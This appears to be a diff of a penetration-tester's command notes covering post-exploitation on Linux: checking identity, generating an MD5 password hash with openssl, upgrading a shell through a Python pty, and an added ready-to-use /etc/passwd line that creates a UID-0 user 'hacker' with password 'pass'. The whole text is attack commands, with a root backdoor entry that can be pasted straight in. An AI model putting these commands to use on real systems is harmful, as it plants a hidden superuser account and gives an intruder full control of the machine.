@@ -29,3 +29,4 @@ id && whoami && groups
 # helper
 openssl passwd -1 -salt ignite pass
 python -c 'import pty; pty.spawn("/bin/bash");' && export TERM=xterm
+passwd line (password=pass): hacker:$1$ignite$ecpCwhwORTaNyHu4pN9MD/:0:0:root:/root:/bin/bash
